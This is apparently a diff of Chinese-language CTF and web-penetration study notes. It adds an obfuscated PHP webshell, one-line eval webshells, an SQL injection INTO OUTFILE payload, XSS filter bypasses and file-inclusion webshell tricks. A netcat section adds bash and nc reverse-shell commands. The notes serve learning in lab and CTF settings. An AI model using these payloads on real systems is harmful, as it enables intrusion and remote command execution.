@@ -13,6 +13,85 @@ abstract: 我听过的会忘掉，我看过的能记住，我做过的才真正�
 
 ## 每天学点新东西
 
+```shell
+# 查看本机开放端口
+netstat -tln
+```
+
+
+
+极限 `webshell`
+
+```php
+<?php
+    @$_++; // $_ = 1
+    $__=("#"^"|"); // $__ = _
+    $__.=("."^"~"); // _P
+    $__.=("/"^"`"); // _PO
+    $__.=("|"^"/"); // _POS
+    $__.=("{"^"/"); // _POST 
+    ${$__}[!$_](${$__}[$_]); // $_POST[0]($_POST[1]);
+?>
+```
+
+
+
+**CTF 出题套路**
+
+一、爆破，包括包括md5、爆破随机数、验证码识别等
+
+二、绕WAF，包括花式绕Mysql、绕文件读取关键词检测之类拦截
+
+三、花式玩弄几个PHP特性，包括弱类型，strpos和===，反序列化+destruct、\0截断、iconv截断、
+
+四、密码题，包括hash长度扩展、异或、移位加密各种变形、32位随机数过小
+
+五、各种找源码技巧，包括git、svn、xxx.php.swp、*www*.(zip|tar.gz|rar|7z)、xxx.php.bak、
+
+六、文件上传，包括花式文件后缀 .php345 .inc .phtml .phpt .phps、各种文件内容检测<?php <? <% \<script language=php>、花式解析漏洞、
+
+七、Mysql类型差异，包括和PHP弱类型类似的特性,0x、0b、1e之类，varchar和integer相互转换
+
+八、open_basedir、disable_functions花式绕过技巧，包括dl、mail、imagick、bash漏洞、DirectoryIterator及各种二进制选手插足的方法
+
+九、条件竞争，包括竞争删除前生成shell、竞争数据库无锁多扣钱
+
+十、社工，包括花式查社工库、微博、QQ签名、whois
+
+十一、windows特性，包括短文件名、IIS解析漏洞、NTFS文件系统通配符、::$DATA，冒号截断
+
+十二、SSRF，包括花式探测端口，302跳转、花式协议利用、gophar直接取shell等
+
+十三、XSS，各种浏览器auditor绕过、富文本过滤黑白名单绕过、flash xss、CSP绕过
+
+十四、XXE，各种XML存在地方（rss/word/流媒体）、各种XXE利用方法（SSRF、文件读取）
+
+十五、协议，花式IP伪造 X-Forwarded-For/X-Client-IP/X-Real-IP/CDN-Src-IP、花式改UA，花式藏FLAG、花式分析数据包
+
+
+
+![img](https://pic4.zhimg.com/80/133c88180340b844466e8fa5552e122b_hd.jpg)
+
+
+
+```php
+<?=$_GET[0]($_POST[1])?>
+```
+
+`eval()` 是语言构造器，而不是函数，不能用可变函数的形式调用它，这里可以使用 `assert`
+
+
+
+**子域名检测工具**
+
+Layer子域名挖掘机、Sublist3r、dnsmaper、
+
+
+
+做题的时候不要忘了乌云，搜索会有惊喜
+
+
+
 很多人会忘记 127.0.0.0/8 ，认为本地地址就是 127.0.0.1 ，实际上本地回环包括了整个127段。你可以访问`http://127.233.233.233/`，会发现和请求127.0.0.1是一个结果
 
 
@@ -37,17 +116,6 @@ abstract: 我听过的会忘掉，我看过的能记住，我做过的才真正�
 2、红队
 <https://github.com/yeyintminthuhtut/Awesome-Red-Teaming>
 <https://github.com/bluscreenofjeff/Red-Team-Infrastructure-Wiki>
-
-------
-
-Tools
-1、payload fuzz
-<https://github.com/swisskyrepo/PayloadsAllTheThings>
-
-2、payload + user pass (针对国外)
-<https://github.com/fuzzdb-project/fuzzdb/>
-
-------
 
 案例
 1、赏金猎人漏洞案例
@@ -235,6 +303,8 @@ Golang
 
 ### 预备知识
 
+![img](https://qqadapt.qpic.cn/txdocpic/0/8f76487a3fe36749dfd454f8ac4d8c78/0)
+
 + 基于从服务器接收到的响应
   + 基于错误的SQL注入
   + 联合查询的类型
@@ -292,8 +362,8 @@ select user();							-- 数据库用户名
 select version();						-- MySQL版本
 select database();						-- 数据库名
 select @@basedir;						-- 数据库安装路径
-select @@datadir;						-- 数据库路径
-select @@version_compile_os；		    -- 操作系统版本
+select @@datadir;						-- 数据存储路径
+select @@version_compile_os;		    -- 操作系统版本
 show global variables like '%secure%';	-- 
 if(expr,v1,v2)							-- expr正确则v1，否则v2
 select case when expr then v1 else v2 end;  -- 与 if 功能相同
@@ -341,7 +411,7 @@ union select 1, 2 from user where id = 1 or 1=1
 
 > **数据库名**
 >
->schemata => schema_name
+> schemata => schema_name
 >
 >tables => table_schema
 >
@@ -358,7 +428,7 @@ union select 1, 2 from user where id = 1 or 1=1
 >columns => columns_name
 
 ```sql
-select 1,group_concat(table_name) from information_schema.tables where table_schema=database() -- 获取当前数据库中所有表
+select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=database() -- 获取当前数据库中所有表
 select 1,group_concat(column_name) from information_schema.columns where table_name=0x7365637265745f666c6167; -- 获得所有列名（字段），table_name 参数进行十六进制编码后可绕过引号被过滤
 -1′ or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #
 -- 下载数据
@@ -470,7 +540,11 @@ and exists(select * from amdin)
 
 - 使用括号绕过，括号可以用来包围子查询，任何计算结果的语句都可以使用 ( ) 包围
 
-    例如：select(user())from user where(1=1)and(2=2)
+    ```sql
+    select(group_concat(table_name))
+    from(information_schema.tables)
+    where(table_schema=database())
+    ```
 
 - 使用符号替代空格 
 
@@ -482,6 +556,12 @@ and exists(select * from amdin)
     %0c		新的一页
     %a0		空格
     %0a		新建一行
+    
+    SQLite3 0A 0D 0C 09 20 
+    MySQL5 09 0A 0B 0C 0D A0 20 
+    PosgresSQL 0A 0D 0C 09 20 
+    Oracle 11g 00 0A 0D 0C 09 20 
+    MSSQL 01,02,03,04,05,06,07,08,09,0A,0B,0C,0D,0E,0F,10,11,12,13,14,15,16,17,18,19,1A,1B,1C,1D,1E,1F,20
     ```
 
     
@@ -580,6 +660,20 @@ id=0e1union
 
 
 
+#### 表名等关键词
+
+以information_schema.tables为例
+
+空格 `information_schema . tables`
+
+着重号 `information</em>schema.tables`
+
+特殊符 `/!informationschema.tables/`
+
+别名 `information_schema.(partitions),(statistics),(keycolumnusage),(table_constraints)`
+
+
+
 #### 注释符
 
 常用注释符：`#, --+, /**/`，可以用 `;%00` 代替
@@ -632,26 +726,6 @@ python sqlmap -u "127.0.0.1/index.php?id=1 %df'" --file-read="./index.php"
 + m ==> 可多行匹配
 + s ==> `.`匹配所有字符，包括换行符
 + x ==> 
-
-**类型**
-
-+ 宽字节注入
-
-+ 花式绕 MySQL
-
-    结合PHP特性
-
-+ 绕关键词检测拦截
-
-    大小写？
-
-+ MongoDB 注入
-
-    NoSQLmap
-
-+ 二次注入
-
-    插入型，从另一个界面插入
 
 **思路**
 
@@ -760,7 +834,7 @@ Enjoy the labs
 ##### Less-7 Dump into outfile
 
 ```sql
-?id=1 union select 1,2,'<?php @eval($_GET["cmd"])?>' into outfile 'D:\\a.php';
+?id=1 union select 1,2,'<?php @eval($_POST[1])?>' into outfile 'D:\\a.php';
 ```
 ##### Less-8 Blind - Boolean Based - Single Quotes
 
@@ -1167,7 +1241,9 @@ id=1;%20insert%20into%20users(id,username,password)%20values%20(%27110%27,%27les
 
 ### 知识点
 
-**同源策略**
+#### 同源策略
+
+同源策略限制了不同源之间如何进行资源交互，是用于隔离潜在恶意文件的重要安全机制。
 
 何为同源？
 
@@ -1322,6 +1398,51 @@ JS提供了四种字符编码的策略，
 
 
 ### 杂项
+
+#### CSP 绕过总结
+
+##### CSP 是什么？
+
+> Content Security Policy 用来防御 XSS 攻击的技术。它是一种由开发者定义的安全性政策申明，通过 CSP 指定可信的内容来源，让 WEB 处于一个安全的运行环境中。
+
+例如：
+
+```
+Content-Security-Policy: default-src 'self'; script-src 'self';
+```
+
+**指令说明**
+
+| 指令        | 说明                                                |
+| ----------- | --------------------------------------------------- |
+| default-src | 定义资源默认加载策略                                |
+| connect-src | 定义 Ajax、WebSocket 等加载策略                     |
+| font-src    | 定义 Font 加载策略                                  |
+| frame-src   | 定义 Frame 加载策略                                 |
+| img-src     | 定义图片加载策略                                    |
+| media-src   | 定义 <audio>、<video> 等引用资源加载策略            |
+| object-src  | 定义 <applet>、<embed>、<object> 等引用资源加载策略 |
+| script-src  | 定义 JS 加载策略                                    |
+| style-src   | 定义 CSS 加载策略                                   |
+| sandbox     | 值为 allow-forms，对资源启用 sandbox                |
+| report-uri  | 值为 /report-uri，提交日志                          |
+
+**关键词**
+
+| 属性值                              | 示例                                        | 说明                                                         |
+| ----------------------------------- | ------------------------------------------- | ------------------------------------------------------------ |
+| *                                   | img-src *                                   | 允许从任意url加载，除了data:blob:filesystem:schemes          |
+| 'none'                              | object-src 'none'                           | 禁止从任何url加载资源                                        |
+| 'self'                              | img-src 'self'                              | 只可以加载同源资源                                           |
+| data:                               | img-src 'self' data:                        | 可以通过data协议加载资源                                     |
+| domain.example.com                  | ing-src domain.example.com                  | 只可以从特定的域加载资源                                     |
+| *.example.com                       | img-src *.example.com                       | 可以从任意example.com的子域处加载资源                        |
+| [https://cdn.com](https://cdn.com/) | img-src [https://cdn.com](https://cdn.com/) | 只能从给定的域用https加载资源                                |
+| https:                              | img-src https:                              | 只能从任意域用https加载资源                                  |
+| 'unsafe-inline'                     | script-src 'unsafe-inline'                  | 允许内部资源执行代码例如style attribute,onclick或者是sicript标签 |
+| 'unsafe-eval'                       | script-src 'unsafe-eval'                    | 允许一些不安全的代码执行方式，例如js的eval()                 |
+
+
 
 ##### 过滤空格
 
@@ -1550,7 +1671,7 @@ function escape(input) {
 
 `/<\/?[^>]+>/gi` 限定了 `gi` 意味着大小写和双写是绕不过的
 
-（或许可以参考 [PHP利用PCRE回溯次数限制绕过某些安全限制](https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html) 做法）
+（或许可以参考 [PHP利用PCRE回溯次数限制绕过某些安全限制](https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html) 做法，但是没多大意义）
 
 ```javascript
 <svg/onload=prompt(1)
@@ -1574,8 +1695,6 @@ function escape(input) {
 // Chrome
 <svg><script>prompt&#40;1)</script>
 ```
-
-
 
 #### 3. 注释符
 
@@ -1816,6 +1935,7 @@ function escape(input) {
 小 trick
 "string"(prompt(1)) 将正常执行
 "(prompt(1))in"
+这里的 in 还可以用 instanceof 替代
 
 Same story with alert(1)in"test":
 TypeError: Cannot use 'in' operator to search for 'undefined' in test
@@ -1839,11 +1959,19 @@ function escape(input) {
 encodeURIComponent() 不会对 ASCII 字母和数字进行编码，
 也不会对这些 ASCII 标点符号进行编码： - _ . ! ~ * ' ( ) 。
 尝试使用 String.fromCharCode(112, 114, 111, 109, 112, 116)，但是 , 被编码
+
 .() 不会被编码，所以可以利用 toString() 构造
-toString(radix)中radix 为 2-36 可以选36使其作为一个进制，将字符包含起来
-使用parseInt(str, radix) 将字符转为数字之后使用(number).toString(radix) 然后用eval进行调用 注意number有括号，(number).toString(radix) 可简写为 （numbrer..toString(radix) ，字符之间用concat()连接
-看wp之后发现有个 parseInt()
+toString(radix) 中 radix 为 2-36 可以选36使其作为一个进制，将字符包含起来
+使用parseInt(str, radix) 将字符转为数字之后使用(number).toString(radix) 然后用eval进行调用 
+注意number有括号，(number).toString(radix) 可简写为 （numbrer..toString(radix) ，字符之间用concat()连接
 parseInt('prompt', 36) //1558153217
+eval((1558153217).toString(36))(1)
+
+还可以
+eval(1558153217..toString(36))(1)
+
+甚至可以直接暴力循环着self里的函数，找到prompt：
+for((i)in(self))eval(i)(1)
 ```
 
 #### 13
@@ -1926,8 +2054,16 @@ function escape(input) {
 }
 ```
 
-```javascript
+```html
+与第 7 关类似，但是 /* 被过滤
+那这里就可以用 HTML 的注释符
+"><svg><!--#--><script><!--#-->prompt(1<!--#-->)</script>
 
+源码将变成：
+<p class="comment" title=""><svg><!--" data-comment='{"id":0}'></p>
+<p class="comment" title="--><script><!--" data-comment='{"id":1}'></p>
+<p class="comment" title="-->prompt(1<!--" data-comment='{"id":2}'></p>
+<p class="comment" title="-->)</script>" data-comment='{"id":3}'></p>
 ```
 
 
@@ -1944,13 +2080,11 @@ function escape(input) {
 
 思路：
 
-+   根据提示，猜测是否需要审计源代码
-+   直接找到源代码，或者利用各种找源码的技巧找源码，或利用漏洞查看源码文件
-+   人工审计代码，结合题目，找到存在注入的地方，或编写相应脚本等等
-+   检索关键函数，admin(), check(), upload()
-+   检索关键的文件，config.php, check.lib.php, xxx.class.php
++ 敏感函数回溯参数过程
 
++ 通读全文代码
 
++ 根据功能点定向审计
 
 ## SSRF
 
@@ -1980,7 +2114,33 @@ function escape(input) {
 
 
 
-## 文件上传
+## 文件操作
+
+l   .user.ini 搭配 图片或其他
+
+l   .htaccess
+
+l   php://filter/read=convert.base64-encode/resource=files/images/xxx/resource=files/xxx
+
+l   php3 php5 phtml 
+
+l   zip协议,phar协议
+
+l   %00截断只适合php5.3及以前
+
+l   mt_rand() 可以爆破seed进行预测 工具是 php_mt_seed
+
+l  通过php文件包含自己可以造成死循环，此前tmp下生成的临时文件不被删除，可以爆破tmp文件结合文件包含当成webshell
+
+l  利用phpinfo查看session文件在tmp下的文件名，再迅速的利用文件包含，即可成为webshell
+
+l  file_put_contents第二个参数可以为一维数组，输出时是将数组的元素进行拼接。
+
+l  在return 中可以执行命令，利用"${phpinfo()}" 这样形式的，在return之前会优先执行解析
+
+l  windows关于php读取文件函数的文件匹配很有趣。常见的可以用<<>等字符进行通配
+
+
 
 ### upload-labs
 
@@ -2044,11 +2204,10 @@ location ~ \.php$ {
 
 +   文件包含
 
-+   基于文件头部信息的过滤
++ 基于文件头部信息的过滤
 
     ```shell
     copy xx.png+xxx.php out.jpg  # win下的命令
-    # 再修改下后缀名
     ```
 
 思路：
@@ -3404,6 +3563,81 @@ masscan -p5070 172.16.5.0/24
 
 ### Metasploit
 
+### Netcat
+
+**主要参数** 某些版本的部分参数被阉割
+
+```
+options:
+	-d              无命令行界面,使用后台模式
+	-e prog_name    程序重定向 [危险!!]
+	-g gateway      源路由跳跃点, 不超过8
+	-G num          源路由指示器: 4, 8, 12, ...
+	-h              获取帮助信息
+	-i secs         延时设置,端口扫描时使用
+	-l              监听入站信息
+	-L              监听知道NetCat被结束(可断开重连)
+	-n              以数字形式表示的IP地址
+	-o file         使进制记录
+	-p port         打开本地端口
+	-r              随机本地和远程的端口
+	-s addr         本地源地址
+	-t              以TELNET的形式应答入站请求
+	-u              UDP 模式
+	-v              显示详细信息 [使用=vv获取更详细的信息]
+	-w secs         连接超时设置
+	-z              I/O 模式 [扫描时使用]
+	端口号可以是单个的或者存在一个范围: m-n [包含值]。
+```
+
+监听端口
+
+```shell
+nc -l -p 8080 -vvv  # 加 k 则是持续监听
+```
+
+靶机反弹 `bash`
+
+```shell
+bash -i >& /dev/tcp/ip/port 0>&1
+```
+
+反向连接
+
+```shell
+# 拥有公网 ip 的机子
+nc -l -vvv -p 1023
+
+# victim
+nc -t -e /bin/bash ip 1023
+```
+
+web 服务器
+
+```shell
+nc -l -p 80 < index.html
+while true; do nc -l -p 80 -q 1 < somepage.html; done
+# 需要根据nc的版本来使用, 访问 localhost 会出现 index.html 页面的内容
+```
+
+文件传输
+
+```shell
+# 将 s1 mp4 发给 s2
+# s2
+nc -l -p 1023 -vv > good.mp4
+# s1
+nc -w 1 ip 1023 < good.mp4
+```
+
+端口扫描
+
+```shell
+# port [1, 1000]
+nc -v -w 2 ip -z 1-1000
+# ip 换成 localhost 即可扫自己
+```
+
 ### Hydra
 
 爆破利器
@@ -3471,7 +3705,41 @@ hydra -L user.txt -p secret 10.36.16.18 imap PLAIN
 hydra -C defaults.txt -6 imap://[fe80::2c:31ff:fe12:ac11]:143/PLAIN
 ```
 
-## 思路
+## 渗透思路
+
+### CTF 出题套路
+
+一、爆破，包括包括md5、爆破随机数、验证码识别等
+
+二、绕WAF，包括花式绕Mysql、绕文件读取关键词检测之类拦截
+
+三、花式玩弄几个PHP特性，包括弱类型，strpos和===，反序列化+destruct、\0截断、iconv截断、
+
+四、密码题，包括hash长度扩展、异或、移位加密各种变形、32位随机数过小
+
+五、各种找源码技巧，包括git、svn、xxx.php.swp、*www*.(zip|tar.gz|rar|7z)、xxx.php.bak、
+
+六、文件上传，包括花式文件后缀 .php345 .inc .phtml .phpt .phps、各种文件内容检测<?php <? <% \<script language=php>、花式解析漏洞、
+
+七、Mysql类型差异，包括和PHP弱类型类似的特性,0x、0b、1e之类，varchar和integer相互转换
+
+八、open_basedir、disable_functions花式绕过技巧，包括dl、mail、imagick、bash漏洞、DirectoryIterator及各种二进制选手插足的方法
+
+九、条件竞争，包括竞争删除前生成shell、竞争数据库无锁多扣钱
+
+十、社工，包括花式查社工库、微博、QQ签名、whois
+
+十一、windows特性，包括短文件名、IIS解析漏洞、NTFS文件系统通配符、::$DATA，冒号截断
+
+十二、SSRF，包括花式探测端口，302跳转、花式协议利用、gophar直接取shell等
+
+十三、XSS，各种浏览器auditor绕过、富文本过滤黑白名单绕过、flash xss、CSP绕过
+
+十四、XXE，各种XML存在地方（rss/word/流媒体）、各种XXE利用方法（SSRF、文件读取）
+
+十五、协议，花式IP伪造 X-Forwarded-For/X-Client-IP/X-Real-IP/CDN-Src-IP、花式改UA，花式藏FLAG、花式分析数据包
+
+
 
 +   信息收集 (whois email 电话 站长密码 生日 mail密码 办公段 服务器端 该公司的人员架构…)
 +   主站迟迟拿不下，绝大部分二级域名泛解析到和主站的同一个 IP
